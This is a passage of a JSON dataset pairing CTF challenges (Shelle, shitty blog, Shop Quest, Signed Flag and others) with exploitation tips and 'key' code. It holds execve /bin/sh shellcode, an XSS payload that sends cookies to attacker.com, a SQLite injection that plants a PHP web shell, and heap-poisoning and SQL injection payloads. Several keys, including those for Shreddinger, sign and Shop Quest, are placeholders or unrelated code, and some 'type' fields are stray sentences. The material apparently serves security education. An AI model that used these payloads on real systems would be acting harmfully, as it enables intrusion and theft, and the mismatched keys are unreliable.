            "Write initial innocuous instruction to file (e.g., `nop` - `0x90`).",
            "Use `mmap` to map this file into memory.",
            "Write the malicious payload (e.g., `execve(\"/bin/sh\", NULL, NULL)`) past the initial `nop` instruction in the memory-mapped area, exploiting the page cache behavior.",
            "Trigger execution of the memory-mapped area, ensuring both the initial `nop` instruction and the appended malicious payload are executed."
        ],
        "key": "```c\n#include <sys/mman.h>\n#include <fcntl.h>\n#include <unistd.h>\n#include <stdio.h>\n#include <string.h>\n\nint main() {\n    int fd = open(\"prog\", O_RDWR | O_CREAT, 0666);\n    if (fd < 0) {\n        perror(\"open\");\n        return 1;\n    }\n\n    // Write a single NOP instruction\n    char nop = 0x90;\n    if (write(fd, &nop, 1) != 1) {\n        perror(\"write\");\n        return 1;\n    }\n\n    // Map the file into memory\n    char *mapped = mmap(NULL, 4096, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_SHARED, fd, 0);\n    if (mapped == MAP_FAILED) {\n        perror(\"mmap\");\n        return 1;\n    }\n\n    // Write shellcode past the NOP instruction\n    char shellcode[] = \"\\x48\\x31\\xc0\\x48\\x89\\xc2\\x48\\x89\"\n                       \"\\xc6\\x48\\x8d\\x3d\\x04\\x00\\x00\\x00\"\n                       \"\\x04\\x3b\\x0f\\x05\\x2f\\x62\\x69\\x6e\"\n                       \"\\x2f\\x73\\x68\\x00\";\n    memcpy(mapped + 1, shellcode, sizeof(shellcode) - 1);\n\n    // Clean up\n    munmap(mapped, 4096);\n    close(fd);\n\n    return 0;\n}\n```"
    },
    {
        "name": "Shelle",
        "write_up": "dataset/raw/Shelle.md",
        "type": "misc",
        "competition": [
            "HacktivityCon/2021",
            "https://ctftime.org/event/1444/tasks/"
        ],
        "score": 50,
        "max_score": 500,
        "difficulty": 0.1,
        "knowledge": [
            "In challenges involving restricted shell environments where direct execution of common commands (e.g., bash, sh) is blocked, using escape sequences or special characters might help bypass these restrictions. For example, discovering that certain characters like `$` or `-` are not blocked can lead to indirect command execution or reveal information about the environment. An effective strategy involves fuzzing to identify unblocked characters and leveraging shell features like environment variables (e.g., `$SHELL`) to gain a more permissive shell or execute commands indirectly. \n   - Example payload to gain shell access when `$SHELL` is not blocked: `$$SHELL`",
            "When faced with a restricted environment where direct information about the location of sensitive files (e.g., `flag.txt`) might not be readily available, utilizing system or process inspection commands that are not restricted (e.g., `ps`, `env`, `set`) can provide hints towards unusual paths or processes that could lead to discovering the flag. This approach relies on the observation of atypical entries in the output of such commands, suggesting where sensitive files or directories might be located.\n   - Example command to inspect potential locations for sensitive files: `ps`"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n#include <unistd.h>\n\nint main() {\n    char command[256];\n    printf(\"root@shelle$\");\n    fgets(command, sizeof(command), stdin);\n    command[strcspn(command, \"\\n\")] = 0; // Remove newline character\n\n    // Check for illegal characters\n    for (int i = 0; i < strlen(command); i++) {\n        if (command[i] == '*' || command[i] == '&' || command[i] == ';') {\n            printf(\"Illegal Character found, for safety reasons only certain characters are allowed\\n\");\n            return 1;\n        }\n    }\n\n    // Execute command\n    if (strcmp(command, \"ls\") == 0) {\n        execl(\"/bin/ls\", \"ls\", NULL);\n    } else if (strcmp(command, \"cat assignment.txt\") == 0) {\n        execl(\"/bin/cat\", \"cat\", \"assignment.txt\", NULL);\n    } else {\n        printf(\"/bin/bash: %s: command not found\\n\", command);\n    }\n\n    return 0;\n}\n```"
    },
    {
        "name": "ShellShellShell",
        "write_up": "dataset/raw/ShellShellShell.md",
        "type": "web",
        "competition": [
            "De1CTF/2019",
            "https://ctftime.org/event/843/tasks/"
        ],
        "score": 363,
        "max_score": 952,
        "difficulty": 0.38130252100840334,
        "knowledge": [
            "In challenges involving backup file disclosure vulnerabilities, it's effective to automatically download potentially exposed backup files such as `.swp` or `.bak` files for sensitive components like `index.php`, `config.php`, or other PHP files. This can be accomplished using scripting to automate the process of appending common backup file extensions to known file names and retrieving them from the server. Example snippet for automatically downloading backup files:\n    ```python\n    import os\n    # Example URL and file extensions to check\n    part_url = 'http://example.com/'\n    file_list = ['.index.php.swp', '.config.php.swp', '.user.php.swp']\n    for i in file_list:\n        os.system(f'curl {part_url + i} > downloaded/{i}')\n    ```",
            "When involved in exploiting SQL injection vulnerabilities that allow for the insertion of malicious SQL via web application functionalities (e.g., publishing features), specially crafted payloads can be utilized to bypass certain filtration methods such as `preg_replace`. This technique is notably effective when the application's logic improperly handles input during SQL command assembly, allowing the attacker to close the initial insertion context and append malicious SQL segments. In such scenarios, including backticks (`` ` ``) around payload components can escape the context and introduce arbitrary SQL execution. Example payload demonstrating this method:\n    ```sql\n    mood=0&signature=a`, `mood`); -- -\n    ```\n    This payload, when injected through a vulnerable insert function, may result in SQL query manipulation leading to unauthorized actions like database enumeration, data exfiltration, or authentication bypass."
        ],
        "key": "```php  \nprivate function get_column($columns){  \n       if(is_array($columns))  \n           $column = ' `'.implode('`,`',$columns).'` ';  \n       else  \n           $column = ' `'.$columns.'` ';  \n       return $column;  \n   }  \npublic function insert($columns,$table,$values){  \n       $column = $this->get_column($columns);  \n       $value = '('.preg_replace('/`([^`,]+)`/','\\'${1}\\'',$this->get_column($values)).')';  \n       $nid =  \n       $sql = 'insert into '.$table.'('.$column.') values '.$value;  \n       $result = $this->conn->query($sql);  \n       return $result;  \n   }  \n```"
    },
    {
        "name": "shitty blog",
        "write_up": "dataset/raw/shitty blog.md",
        "type": "pwn",
        "competition": [
            "HXP/2021",
            "https://ctftime.org/event/1447/tasks/"
        ],
        "score": 250,
        "max_score": 1000,
        "difficulty": 0.25,
        "knowledge": [
            "In a challenge where an application's logic relies on session management through HMAC verification, a flawed implementation in handling binary data can lead to HMAC forgery. Specifically, if a function like `crypt()` in PHP is used to hash the output of `hash_hmac()` and is not binary safe, it may terminate the processed string at a null byte (`\\x00`), causing an inconsistency in security checks. This can be exploited by generating payloads that cause the hash to start with a null byte, effectively bypassing the HMAC verification with a significantly higher chance (`1 / 256`) than brute-forcing the secret key.\n\nExample of Python code to exploit this:\n```python\ndef get_null_mac():\n    mac_counter = set()\n    for i in tqdm(itertools.count()):\n        res = requests.get(URL_BASE)\n        id, mac = urllib.parse.unquote(res.cookies[\"session\"]).split(\"|\")\n        if mac in mac_counter:\n            return mac\n        mac_counter.add(mac)",
            "For challenges involving SQL injection vulnerabilities specifically within SQLite databases, if the application allows dynamic creation of database objects (databases, tables), an attacker can perform SQL injection to achieve remote code execution (RCE) by attaching a new database and creating a `.php` file in a writable directory served by the webserver. This file can then be accessed directly via the webserver, executing any PHP code included within. It's crucial that the payload creates a file with a `.php` extension and includes PHP code that can be executed upon request.\n\nExample payload for SQL injection to RCE:\n```sql\n'; ATTACH DATABASE '/var/www/html/data/lol-abcdefg.php' AS lol; CREATE TABLE lol.pwn (dataz text); INSERT INTO lol.pwn (dataz) VALUES ('<?php system($_GET[\"cmd\"]); ?>'); --\n```"
        ],
        "key": "```php  \nfunction delete_entry($db, $entry_id, $user_id) {  \n   $db->exec(\"DELETE from entry WHERE {$user_id} <> 0 AND id = {$entry_id}\");  \n}  \n```\n\n```php  \n# Verifying an HMAC  \nif( ! hash_equals(crypt(hash_hmac('md5', $session[0], $secret, true), $salt),\n$salt.$session[1])) {  \n   exit();  \n}  \n```\n\n```php  \n# Generating an HMAC  \n$mac = substr(crypt(hash_hmac('md5', $id, $secret, true), $salt), 20);\n```"
    },
    {
        "name": "Shop Manager",
        "write_up": "dataset/raw/Shop Manager.md",
        "type": "pwn",
        "competition": [
            "COMPFEST/2021",
            "https://ctftime.org/event/1358/tasks/"
        ],
        "score": 496,
        "max_score": 500,
        "difficulty": 0.992,
        "knowledge": [
            "When exploiting heap buffer overflow vulnerabilities, if additional space can be allocated beyond the intended size, this can facilitate arbitrary memory manipulations, such as expanding a chunk to overlap with adjacent chunks. This was demonstrated by editing the size of a heap chunk to a larger size to manipulate adjacent heap metadata.\n   - Example manipulation: Editing an item's name with \"a\"*0x28+p64(0x431) to change the adjacent chunk size.",
            "Leverage the manipulation of heap metadata and unsorted bin chunks for leaking libc addresses and performing tcache poisoning. By carefully managing heap operations (add, delete, edit), it's possible to place libc addresses into application-controlled heap chunks and subsequently adjust the free list (tcache) to point to arbitrary addresses (e.g., `__free_hook`). This allows injection of malicious addresses into the application's execution flow.\n   - Example for leaking libc address: After resizing and freeing a chunk to create an unsorted bin, add a new item to place the unsorted bin's libc address into a controllable heap area, then list items to leak the address.\n   - Example for tcache poisoning: Add a new item, delete two items to adjust the free list, then edit an item to overwrite a freed chunk's forward pointer with the address of `__free_hook`. This manipulation directs subsequent malloc calls to return a pointer to `__free_hook`, allowing overwriting it with the address of `system`."
        ],
        "key": "```c\nvoid addItem(void)\n\n{  \n long lVar1;  \n int iVar2;  \n void *pvVar3;  \n  \n iVar2 = idx;  \n if (idx == N) {  \n   puts(\"Our shop is full.\");  \n }  \n else {  \n   pvVar3 = malloc(0x10);  \n   *(void **)(items + (long)iVar2 * 8) = pvVar3;  \n   lVar1 = *(long *)(items + (long)idx * 8);  \n   pvVar3 = malloc(0x20);  \n   *(void **)(lVar1 + 8) = pvVar3;  \n   printf(\"Item name: \");  \n   __isoc99_scanf(\"%s\",*(undefined8 *)(*(long *)(items + (long)idx * 8) + 8));  \n   printf(\"Item price: \");  \n   __isoc99_scanf(\"%ld\",*(undefined8 *)(items + (long)idx * 8));  \n   idx = idx + 1;  \n   puts(\"Item added successfully.\");  \n }  \n return;  \n}  \n```"
    },
    {
        "name": "Shop Quest",
        "write_up": "dataset/raw/Shop Quest.md",
        "type": "web",
        "competition": [
            "VolgaCTF/2018/Quals",
            "https://ctftime.org/event/539/tasks/"
        ],
        "score": 500,
        "max_score": 500,
        "difficulty": 1.0,
        "knowledge": [
            "When facing potential XSS vulnerabilities, particularly in web applications using frameworks like Vue.js, it is possible to craft payloads that execute arbitrary JavaScript in the context of another user's session (e.g., the operator's session in a chat application). This can be leveraged to exfiltrate sensitive information, such as document contents or cookies, to an attacker-controlled server. The exploitation can be enhanced in scenarios where the payload can trigger an action from the victim's browser, such as sending a request with the victim's session cookies or document data encoded in Base64.\n   - Example payload for exfiltrating the session cookie: `${toString.constructor('document.location = \"http://attacker.com/?\"+document.cookie')()}`",
            "In the presence of SQL injection vulnerabilities, especially where input is directly incorporated into database queries, it's imperative to test for different types of comment syntax to bypass potential filters or restrictions. This involves experimenting with various commenting techniques (`--`, `#`, `/* */`, etc.) to identify which ones effectively nullify the rest of the query, allowing for successful exploitation. Once a vulnerability is identified, it's possible to use UNION-based SQL injection to extract sensitive information from other tables in the database, such as user credentials or administrative hashes. This technique is particularly useful in scenarios where error messages or the application's responses reveal the structure or contents of the database.\n   - Sample UNION-based SQL Injection payload: `/Chat/getMessages?chatId=1`+union+select+login,hash,role,4+from+users+where+role=3--+-`"
        ],
        "key": "```php\n<?php\n// Vulnerable code snippet for file upload\nif (isset($_FILES['file'])) {\n    $file_name = $_FILES['file']['name'];\n    $file_tmp = $_FILES['file']['tmp_name'];\n    $file_ext = strtolower(end(explode('.', $file_name)));\n    \n    // Simple extension filter\n    $file_ext = str_replace(['php', 'htm'], '', $file_ext);\n    \n    $new_file_name = uniqid() . '.' . $file_ext;\n    move_uploaded_file($file_tmp, \"uploads/\" . $new_file_name);\n}\n?>\n```"
    },
    {
        "name": "Shop V",
        "write_up": "dataset/raw/Shop V.2.md",
        "type": "This write-up describes a Capture The Flag (CTF) challenge related to exploiting a vulnerability in a shopping application built with Spring Boot in Java. Based on the provided description and solution, this challenge falls under the **web** category.",
        "competition": [
            "VolgaCTF/2019/Quals",
            "https://ctftime.org/event/713/tasks/"
        ],
        "score": -1.0,
        "max_score": 500,
        "difficulty": -1,
        "knowledge": [
            "When exploiting mass assignment vulnerabilities in applications using the Spring Boot framework, especially when `ModelAttribute` is used, it's critical to understand the correct property names expected by the backend. If the application uses complex types like lists or objects, one must correctly structure the payload to match the expected format (`propertyName[index].attribute`) and account for any custom setter method names that don't directly map to the property name. If direct URL manipulation doesn't encode parameters properly, crafting a custom HTML form with the correct input names (`cartItems[0].id` vs. `cart[0].id`) is a viable workaround.\n   - Example HTML form element for payload: `<input type=\"hidden\" name=\"cartItems[0].id\" value=\"4\" />`",
            "The existence of a `robots.txt` file can reveal sensitive information or the locations of resources not intended to be found easily. In the context of CTF challenges or penetration testing, always check the `robots.txt` as it may contain paths to files or directories with source code, configuration files, or other interesting endpoints that could lead to vulnerabilities such as outdated versions or disabled features revealing implementation details."
        ],
        "key": "```java\n@Controller  \npublic class ShopController {  \n// [...]  \n    @RequestMapping({\"/profile\"})  \n    public String profile(@ModelAttribute(\"user\") User user, Model templateModel, HttpServletRequest request) {  \n        HttpSession session = request.getSession();  \n        if (session.getAttribute(\"user_id\") == null) {  \n            return \"redirect:index\";  \n        } else {  \n            List<Product> cart = new ArrayList();  \n            user.getCartItems().forEach((p) -> {  \n                cart.add(this.productDao.geProduct(p.getId()));  \n            });  \n            templateModel.addAttribute(\"cart\", cart);  \n            return \"profile\";  \n        }  \n    }\n}\n```"
    },
    {
        "name": "Show me your private key",
        "write_up": "dataset/raw/Show me your private key.md",
        "type": "crypto",
        "competition": [
            "Harekaze/2019",
            "https://ctftime.org/event/789/tasks/"
        ],
        "score": 200,
        "max_score": 400,
        "difficulty": 0.5,
        "knowledge": [
            "When solving elliptic curve cryptography challenges and the elliptic curve order (`#EC`) calculation is required, but unable to be directly computed due to a composite modulus (`n`), calculate the order by factoring `n` into primes (`p` and `q`) and using these to separately compute the order in each field. Then multiply these orders to obtain `#EC`. This is based on the fact that the order of an elliptic curve over a composite modulus can be obtained by multiplying the orders of the curve over the prime fields.",
            "Recovering a private key (`d`) or a generator point (`G`) on an elliptic curve in cryptographic challenges can be achieved by performing operations inverse to encryption or generator multiplication. Given an encryption multiplier (`e`) and a point on the curve (`C`), calculate the modular inverse of `e` with respect to the curve's order (`#EC`). Then, use this inverse to multiply the point `C`, thus obtaining the original generator point `G`. This demonstrates how cryptographic operations can be reversed given certain parameters, allowing for the decryption or private key recovery in CTF challenges.\n\nExample payload steps:\na. Compute `b` from a known point `(Cx, Cy)` on the curve as `b = (Cy^2 - Cx^3) mod n`.\nb. With `p` and `q`, calculate curve orders `E1.order()` and `E2.order()`, then multiply for `#EC`.\nc. Find `einv` as the modular inverse of `e` over `#EC`.\nd. Calculate `G` from `C` using `einv`, extract coordinates `(Gx, Gy)`, and convert to flag format."
        ],
        "key": "```python\nb = (pow(Cy, 2, n) - pow(Cx, 3, n)) % n  \nEC = EllipticCurve(Zmod(n), [0, b])  \nC = EC(Cx, Cy)  \neinv = inverse_mod(e, E_order)  \nG = einv * C  \n```"
    },
    {
        "name": "Shreddinger",
        "write_up": "dataset/raw/Shreddinger.md",
        "type": "The type of this CTF challenge is: forensics",
        "competition": [
            "NuitduHack/2018/Quals",
            "https://ctftime.org/event/583/tasks/"
        ],
        "score": 500,
        "max_score": 600,
        "difficulty": 0.8333333333333334,
        "knowledge": [
            "In challenges involving the reconstruction of a shredded document or image, simulated annealing can be an effective approach. This should start with a random arrangement of the shredded pieces, attempt swaps or rotations to explore new configurations, and evaluate these using a scoring function based on pixel differences at the seams. This process will iteratively refine the configuration towards the correct arrangement. Occasional mutations can help escape local minima. This technique is especially useful when direct reconstruction algorithms fail due to the complexity of the document's layout or the need for speed in reassembly.",
            "For image-based challenges where OCR (Optical Character Recognition) is required, and standard tools fail due to unique font styles or distorted text, creating a custom OCR solution may be necessary. This involves manually creating font images for each character and writing a script to match these against the text in the image. This tailored approach allows for accurate text extraction from images where conventional OCR tools like Tesseract are ineffective. Such a method is beneficial when dealing with non-standard fonts, distorted or stylized text that common OCR software cannot accurately interpret."
        ],
        "key": "```python\ndef is_vulnerable_strip(strip):\n    # Simulated function to check if a strip is vulnerable\n    return True\n\ndef shred_document(document):\n    strips = []\n    for i in range(0, len(document), 10):  # Assume each strip is 10 characters\n        strip = document[i:i+10]\n        if is_vulnerable_strip(strip):\n            strips.append(strip)\n    return strips\n\ndef reconstruct_document(strips):\n    # Simulated reconstruction logic\n    reconstructed = ''.join(strips)\n    return reconstructed\n\n# Example usage\ndocument = \"This is a very sensitive document that should not be shredded.\"\nstrips = shred_document(document)\nreconstructed_document = reconstruct_document(strips)\nprint(reconstructed_document)\n```"
    },
    {
        "name": "sidhe",
        "write_up": "dataset/raw/sidhe.md",
        "type": "crypto",
        "competition": [
            "PlaidCTF/2020",
            "https://ctftime.org/event/936/tasks/"
        ],
        "score": 300,
        "max_score": 550,
        "difficulty": 0.5454545454545454,
        "knowledge": [
            "In cryptographic challenges involving supersingular isogeny key exchange protocols, exploiting the single selection of a private secret that remains constant across multiple key exchanges can lead to private key recovery. This can be done by slightly altering the public keys for each exchange and observing the effect on the derived shared secrets. If altering a component of the public key (for example, flipping the least significant bit of a parameter) changes the derived shared secret, it indicates that the corresponding bit in the private secret is a '1'; if it does not change, the bit is a '0'. This method allows for bit-by-bit recovery of the private secret through repeated interactions with the server.",
            "For cryptographic algorithms involving operations over elliptic curves and isogenies, when looking to exploit vulnerabilities for key recovery, it is essential to adapt mathematical operations based on the specific group actions (e.g., using 2^e or 3^e operations). Including scaling factors and ensuring operations pass necessary conditions (such as Weil Pairing checks) enables recovery of private key coefficients one at a time. This approach typically involves constructing certain relations that depend on guessing bits or coefficients of the secret and observing whether the protocol interactions remain consistent with those guesses. When direct recovery methods fail due to protocol constraints (e.g., highest coefficients in a polynomial representation of a key cannot be determined), a brute-force search over the remaining possibilities coupled with oracle access (sending crafted messages and observing responses) can be used to find the complete secret key."
        ],
        "key": "```python  \ndef isoex3(sk3, pk2):  \n   Ei, P, Q = pk2  \n   S = P+sk3*Q  \n   for i in range(e3):  \n       R = (3^(e3-i-1))*S  \n       phi = Ei.isogeny(R)  \n       Ei = phi.codomain()  \n       S = phi(S)  \n   return Ei.j_invariant()  \n```"
    },
    {
        "name": "Sign Me Up 797",
        "write_up": "dataset/raw/Sign Me Up 797.md",
        "type": "crypto",
        "competition": [
            "AUCTF/2020",
            "https://ctftime.org/event/1020/tasks/"
        ],
        "score": -1,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When encountering RSA encrypted messages where each character is encrypted individually, one effective approach is to iterate through all possible ASCII values, encrypt each using the RSA formula `(char_value ** e) % N`, and map these encrypted values to their corresponding characters. This mapping can then be used to decode the ciphertext by matching each encrypted number with its corresponding character. This method relies on the assumption that the plaintext is composed of ASCII characters, which is common in CTF challenges for encoding readable text. \n\n    Sample Python snippet for creating the decryption mapping:\n    ```python\n    N = 20312493432722984634615913227523125265781662152013094377607630781356105942700273581600613724248110835803158659086732527322062709047441686884292861771528866639670389435647460159612029672461252955594829829663172687201461554413049025271464412190235617740846789840419025423396967519520427432799227162339126087426790939948330768088600429869826069490486741417370162186831426441346576810446894902659826134877586519596679449287778809427232767231366708775004671368581690484301650399106765403344734339945464967775820750215294237822308697430395972800155973323880641007064174229976873404987801414040860359400339131120435868680687\n    e = 65537\n\n    dic = {}\n    for i in range(33, 300):  # Basic ASCII range (extended to include special characters just in case)\n        encrypted_char = pow(i, e, N)  # Efficient power mod function\n        dic[encrypted_char] = chr(i)\n    ```",
            "For decryption of the ciphertext when it's known that each character is individually encrypted, one can parse the ciphertext into individual encrypted numbers, use the previously created decryption mapping to find each character, and construct the plaintext message. This technique bypasses the need for factorizing the RSA modulo or obtaining the private key, enabling decryption with only the public key details and the assumption about individual character encryption.\n\n    Sample Python snippet for decrypting the message:\n    ```python\n    # Assuming 'dic' is the dictionary from the encryption step containing the encrypted_char to char mapping\n    # Assuming 'list_char' is a list of the individually encrypted character numbers from the ciphertext\n\n    ans = ''\n    for encrypted_char in list_char:\n        if int(encrypted_char) in dic:  # Check if the encrypted number is in our mapping\n            ans += dic[int(encrypted_char)]  # Look up the character in our dictionary and append to the answer\n        else:\n            ans += '?'  # Placeholder for characters not found (useful for debugging)\n    print(ans)\n    ```\n    This method showcases the adaptability and the quick decryption capabilities in scenarios with simple encryption schemes, an understanding of the encryption method used, and when direct decryption keys or methods are not feasible or available."
        ],
        "key": "```python\ndef encrypt_character(character, e, N):\n    return pow(ord(character), e, N)\n\ndef encrypt_message(message, e, N):\n    return [encrypt_character(char, e, N) for char in message]\n\n# Example usage\nN = 20312493432722984634615913227523125265781662152013094377607630781356105942700273581600613724248110835803158659086732527322062709047441686884292861771528866639670389435647460159612029672461252955594829829663172687201461554413049025271464412190235617740846789840419025423396967519520427432799227162339126087426790939948330768088600429869826069490486741417370162186831426441346576810446894902659826134877586519596679449287778809427232767231366708775004671368581690484301650399106765403344734339945464967775820750215294237822308697430395972800155973323880641007064174229976873404987801414040860359400339131120435868680687\ne = 65537\n\nmessage = \"Hello, World!\"\nencrypted_message = encrypt_message(message, e, N)\nprint(encrypted_message)\n```"
    },
    {
        "name": "sign",
        "write_up": "dataset/raw/sign.md",
        "type": "misc",
        "competition": [
            "0x41414141/2021",
            "https://ctftime.org/event/1249/tasks/"
        ],
        "score": -1.0,
        "max_score": 1000,
        "difficulty": -1,
        "knowledge": [
            "When dealing with executable binaries in CTF challenges that do not easily give up their secrets through simple methods such as the `strings` command, further analysis using tools like radare2 can reveal hidden or obfuscated content. After loading the binary into radare2 and issuing the `aaa` command to analyze all referenced symbols and functions, followed by `afl` to list the functions, targeted examination of suspicious functions (such as `WinMain` in Windows binaries) can uncover hardcoded secrets, flags, or clues for further exploration. \n\n   Example investigative workflow:  \n   1. Open binary in radare2: `r2 binary_name`  \n   2. Analyze all: `aaa`  \n   3. List functions: `afl`  \n   4. Print function details: `pdf @ sym.function_name`",
            "In CTF challenges that involve binaries compiled for Windows, it is important to consider character encoding differences, such as UTF-16LE commonly used in Windows environments. This might render usual text scanning tools like `strings` ineffective for finding plaintext secrets directly within the binary. Instead, using binary analysis tools that can interpret or display strings in a variety of encodings will help in uncovering hidden flags or data. In scenarios where `strings` fails to find the flag, consider searching the binary for Unicode or UTF-16LE encoded strings manually or with a tool that supports such features.\n\n   Example command for strings with encoding consideration:  \n   `strings -e l binary_name`  (where `-e l` specifies little-endian UTF-16 encoding)"
        ],
        "key": "```c\n#include <stdio.h>\n#include <string.h>\n\nvoid vulnerable_function(char *input) {\n    char buffer[64];\n    strcpy(buffer, input); // Vulnerable to buffer overflow\n}\n\nint main(int argc, char *argv[]) {\n    if (argc > 1) {\n        vulnerable_function(argv[1]);\n    } else {\n        printf(\"Please provide an input.\\n\");\n    }\n    return 0;\n}\n```"
    },
    {
        "name": "Signal of Hope",
        "write_up": "dataset/raw/Signal of Hope.md",
        "type": "The type of this CTF challenge is reverse.",
        "competition": [
            "angstrom/2020",
            "https://ctftime.org/event/982/tasks/"
        ],
        "score": 120,
        "max_score": 300,
        "difficulty": 0.4,
        "knowledge": [
            "When debugging CTF challenges involving signals, particularly with gdb, changing specific signal behaviors (e.g., Trace trap from SIGTRAP to another signal like SIGTERM) can be crucial for effective debugging. This allows bypassing certain restrictions or behaviors enforced by gdb or the program itself that could hinder analysis. Doing so enables a smoother inspection process. For instance:\n   - Change signal handlers in the code to use less commonly used signals for debugging purposes, like changing `SIGTRAP` (Trace trap) to `SIGTERM` to avoid gdb's special handling of the trace trap.",
            "Using symbolic execution frameworks like Z3 Solver can be highly effective in reversing and solving challenges that involve mathematical or logical operations on unknown values. By modelling the challenge's constraints and requirements as equations or logical expressions, one can automate the discovery of inputs that satisfy those conditions. In challenges where the input is manipulated and checked against specific criteria, translating these operations into constraints and using a solver like Z3 can quickly find valid inputs or secret keys.\n   - Example use of Z3 Solver for reversing:\n     ```python\n     from z3 import *\n     s = Solver()\n     key = [BitVec('key_%d' % i, 8) for i in range(10)]  # Example for 10 characters key\n     # Add constraints based on the challenge's logic here\n     # e.g., s.add(key[0] + key[4] + key[4 + key[4]] == 6)\n     if s.check() == sat:\n         m = s.model()\n         print(''.join(chr(m[k].as_long()) for k in key))\n     ```\n     This Z3 approach transforms the problem-solving process from manual analysis to automated reasoning, expediting the acquisition of the flag in challenges where input needs to meet certain complex criteria."
        ],
        "key": "```c++\nvoid handler(int code)  \n{  \n int v1 = 0, i;  \n  \n while ( 1 )  \n {  \n   i = v1;  \n   if (code == signal_codes[v1] )  \n     break;  \n   if ( ++v1 == 7 )  \n   {  \n     i = -1LL;  \n     break;  \n   }  \n }  \n handlers[i]();  \n}  \n```\n\n```c++\nvoid vm()  \n{  \n __int64 v0;  \n __int64 v1;  \n char v2;\n\n switch ( opcode )  \n {  \n   case 0xF0u:  \n     var1 = input[i] - input_byte;  \n     break;  \n   case 0xF1u:  \n     var1 += var2;  \n     break;  \n   case 0xF2u:  \n     var1 -= var2;  \n     break;  \n   case 0xF3u:  \n     var1 *= var2;  \n     break;  \n   case 0xF4u:  \n     var1 ^= var2;  \n     break;  \n   case 0xF5u:  \n     var2 = var1;  \n     break;  \n   case 0xF6u:  \n     var1 = var2;  \n     break;  \n   case 0xF7u:  \n     v1 = j++;  \n     buffer[v1] = var1;  \n     break;  \n   case 0xF8u:  \n     var1 = buffer[--j];  \n     break;  \n   case 0xF9u:  \n     if ( var1 != var2 )  \n     {  \n       puts(\"The trap is not approving of your trip.\");  \n       puts(\"It blocks your passage with its whip.\");  \n       exit(1);  \n     }  \n     return;  \n   case 0xFAu:  \n     var1 = input[i];  \n     break;  \n   case 0xFBu:  \n     v2 = var2;  \n     var2 = var1;  \n     var1 = v2;  \n     break;  \n   case 0xFCu:  \n     v0 = k++;  \n     byte_602280[v0] = var1;  \n     break;  \n   case 0xFDu:  \n     var1 = byte_602280[--k];  \n     break;  \n   default:  \n     puts(\"The trap shorts out and sparks like crazy.\");  \n     puts(\"But a spark hits you and you become hazy.\");  \n     exit(1);  \n     return;  \n }  \n}  \n```"
    },
    {
        "name": "Signature Server",
        "write_up": "dataset/raw/Signature Server.md",
        "type": "crypto",
        "competition": [
            "CTFZone/2018/Quals",
            "https://ctftime.org/event/632/tasks/"
        ],
        "score": 148,
        "max_score": 500,
        "difficulty": 0.296,
        "knowledge": [
            "In scenarios involving the application of cryptographic signatures, if message modification checks occur before message padding or normalization, it is possible to bypass these checks by crafting a payload that passes the checks and then relies on the application to transform it into a form identical to the disallowed content. Specifically, submitting a truncated version of a command that is padded on the server side to form a disallowed command can effectively bypass restrictions on signing certain commands. This technique works effectively when server-side logic pads the message to a specific length, inadvertently converting it into a restricted command, thus enabling unintended signature generation.",
            "When dealing with cryptographic challenges that involve checksum and signature generation where the checksum length is notably short, brute-force techniques can be applied to forge the checksum portion of a payload if the checksum algorithm produces a small number of bytes. Specifically, in cases where the checksum is a small part of a larger signature scheme and some parts of the checksum (like the last few bytes) are fixed or predictable, reducing the brute-force effort to only the variable part of the checksum can make it feasible to find a checksum collision. This approach works well when the number of brute-forcing attempts needed is within a practical limit, such as 2^16 attempts for a 2-byte checksum with a fixed ending."
        ],
        "key": "```python\ndef sign(self, data):  \n   decoded_data = base64.b64decode(data)  \n   if len(decoded_data) > MESSAGE_LENGTH:  \n       return \"Error: message too large\"  \n   if decoded_data == show_flag_command or decoded_data == admin_command:  \n       return \"Error: nice try, punk\"  \n   decoded_data += (MESSAGE_LENGTH - len(decoded_data)) * \"\\xff\"  \n   decoded_data += self.wc_generate(decoded_data)  \n   signature = \"\"  \n   for i in range(0, CHANGED_MESSAGE_LENGTH):  \n       signature += self.sign_byte(ord(decoded_data[i]), i)  \n   return base64.b64encode(decoded_data) + ',' + base64.b64encode(signature)  \n```"
    },
    {
        "name": "Signed Flag",
        "write_up": "dataset/raw/Signed Flag.md",
        "type": "crypto",
        "competition": [
            "TMUCTF/2021",
            "https://ctftime.org/event/1427/tasks/"
        ],
        "score": 492,
        "max_score": 500,
        "difficulty": 0.984,
        "knowledge": [
            "In a scenario involving the analysis of DSA (Digital Signature Algorithm) vulnerabilities, specifically when the same nonce (`k`) is reused across different signatures, it is possible to recover the nonce and subsequently, the private key (`d` or `x`), from known messages and their signatures. This can be done by calculating the difference between two message hashes and their signature `s` values, and then applying modular inverse operations. Given `q` (the prime divisor of `p-1`), `r` (part of the signature), two message hashes (`hm1`, `hm2`), and their corresponding `s` values (`s1`, `s2`), one can compute `k` as follows:\n   - First, calculate the difference of `s` values (`ds = s2 - s1`) and the difference of message hashes (`dm = hm2 - hm1`).\n   - Compute `k = (inverse(ds, q) * dm) % q`.",
            "Knowing `k`, the private key `x` can be recovered from a single signature (`s`, `r`) and the hash of a signed message (`hm`). This is critical for scenarios where an attacker intercepts or can calculate the hash of a known message and its signature. The formula to compute the private key `x` is:\n   - `x = ((s*k - hm) * inverse(r, q)) % q`.\n   \nThese methods are particularly effective in cryptanalysis and cybersecurity practices for identifying and exploiting vulnerabilities in digital signature schemes, where nonce reuse or poorly secured key handling practices are present."
        ],
        "key": "```python\ndef sign(msg, k, p, q, g, d):  \n   while True:  \n       r = powmod(g, k, p) % q  \n       h = int(sha1(msg).hexdigest(), 16)  \n       try:  \n           s = (invert(k, q) * (h + d * r)) % q  \n           return r, s  \n       except ZeroDivisionError:  \n           pass\n```"
    },
    {
        "name": "Silhouettes",
        "write_up": "dataset/raw/Silhouettes.md",
        "type": "pwn",
        "competition": [
            "Balsn/2019",
            "https://ctftime.org/event/811/tasks/"
        ],
        "score": 1000,
        "max_score": 1000,
        "difficulty": 1.0,
        "knowledge": [
            "When encountering a web service that accepts file uploads, assess the security of the file handling practices, particularly how the service processes and interprets the file names and content. If the service uses external libraries or tools (e.g., ImageIO, `dcmdjpeg.exe`) to process uploaded files, investigate those tools for known vulnerabilities or insecure practices, such as using `subprocess` with `shell=True` in Python, which can lead to remote code execution if user input is not properly sanitized. This vulnerability can often be exploited by crafting file names that inject shell commands or by uploading specially crafted files designed to trigger insecure behavior in the processing libraries.",
